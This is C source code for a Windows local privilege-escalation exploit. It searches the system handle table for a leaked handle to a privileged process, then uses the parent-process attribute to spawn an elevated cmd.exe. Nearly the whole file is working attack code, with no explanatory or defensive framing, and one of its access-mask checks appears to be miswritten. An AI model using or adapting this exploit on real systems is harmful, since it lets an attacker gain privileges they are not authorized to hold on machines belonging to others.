
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#include "client.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")


HANDLE GetVulnProcHandle(void) {
    
	ULONG handleInfoSize = 0x10000;
    NTSTATUS status;
    PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION) malloc(handleInfoSize);
	HANDLE hProc = NULL;
	POBJECT_TYPE_INFORMATION objectTypeInfo;
	PVOID objectNameInfo;
	UNICODE_STRING objectName;
    ULONG returnLength;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    DWORD dwOwnPID = GetCurrentProcessId();
	
    pNtQuerySystemInformation = GetProcAddress(hNtdll, "NtQuerySystemInformation");
    pNtDuplicateObject = GetProcAddress(hNtdll, "NtDuplicateObject");
    pNtQueryObject = GetProcAddress(hNtdll, "NtQueryObject");
    pRtlEqualUnicodeString = GetProcAddress(hNtdll, "RtlEqualUnicodeString");
    pRtlInitUnicodeString = GetProcAddress(hNtdll, "RtlInitUnicodeString");

    printf("[+] Grabbing handles...");

    while ((status = pNtQuerySystemInformation( SystemHandleInformation, phHandleInfo, handleInfoSize,
											NULL )) == STATUS_INFO_LENGTH_MISMATCH)
        phHandleInfo = (PSYSTEM_HANDLE_INFORMATION) realloc(phHandleInfo, handleInfoSize *= 2);

    if (status != STATUS_SUCCESS)
    {
        printf("[!] NtQuerySystemInformation failed!\n");
        return 0;
    }

    printf("done.\n[+] Fetched %d handles.\n", phHandleInfo->NumberOfHandles);

    // iterate handles until we find the privileged process handle
    for (int i = 0; i < phHandleInfo->NumberOfHandles; ++i)
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handle = phHandleInfo->Handles[i];

        // Check if this handle belongs to our own process
        if (handle.UniqueProcessId != dwOwnPID)
            continue;

        objectTypeInfo = (POBJECT_TYPE_INFORMATION) malloc(0x1000);
        if (pNtQueryObject( (HANDLE) handle.HandleValue,
						ObjectTypeInformation,
						objectTypeInfo,
						0x1000,
						NULL ) != STATUS_SUCCESS)
            continue;

		// skip some objects to avoid getting stuck
		// see: https://github.com/adamdriscoll/PoshInternals/issues/7
        if (handle.GrantedAccess == 0x0012019f
			&& handle.GrantedAccess != 0x00120189
			&& handle.GrantedAccess != 0x120089
			&& handle.GrantedAccess != 0x1A019F ) {
            free(objectTypeInfo);
            continue;
        }

		// get object name information
        objectNameInfo = malloc(0x1000);
        if (pNtQueryObject( (HANDLE) handle.HandleValue,
						ObjectNameInformation,
						objectNameInfo,
						0x1000,
						&returnLength ) != STATUS_SUCCESS) {
            
			// adjust the size of a returned object and query again
			objectNameInfo = realloc(objectNameInfo, returnLength);
            if (pNtQueryObject( (HANDLE) handle.HandleValue,
							ObjectNameInformation,
							objectNameInfo,
							returnLength,
							NULL ) != STATUS_SUCCESS) {
                free(objectTypeInfo);
                free(objectNameInfo);
                continue;
            }
        }

        // check if we've got a process object
        objectName = *(PUNICODE_STRING) objectNameInfo;
        UNICODE_STRING pProcess;

        pRtlInitUnicodeString(&pProcess, L"Process");
        if (pRtlEqualUnicodeString(&objectTypeInfo->TypeName, &pProcess, TRUE)) {
            printf("[+] Found process handle (%x)\n", handle.HandleValue);
            hProc = (HANDLE) handle.HandleValue;
			free(objectTypeInfo);
			free(objectNameInfo);
			break;
        }
        else
            continue;
        
        free(objectTypeInfo);
        free(objectNameInfo);
    }
	
	return hProc;
} 


int main(int argc, char **argv) {
	
	HANDLE hProc = NULL;
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
	int pid = 0;
	SIZE_T size;
	BOOL ret;

	Sleep(20000);
	// find leaked process handle
	hProc = GetVulnProcHandle();

	if ( hProc != NULL) {

		// Adjust proess attributes with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
		ZeroMemory(&si, sizeof(STARTUPINFOEXA));

		InitializeProcThreadAttributeList(NULL, 1, 0, &size);
		si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc( GetProcessHeap(), 0, size );
		
		InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
		UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL);

		si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
		
		// Spawn elevated cmd process
		ret = CreateProcessA( "C:\\Windows\\system32\\cmd.exe", NULL, NULL, NULL, TRUE, 
			EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOA)(&si), &pi );

		if (ret == FALSE) {
			printf("[!] Error spawning new process: [%d]\n", GetLastError());
			return -1;
		}
	}
	
	Sleep(20000);
    return 0;
}

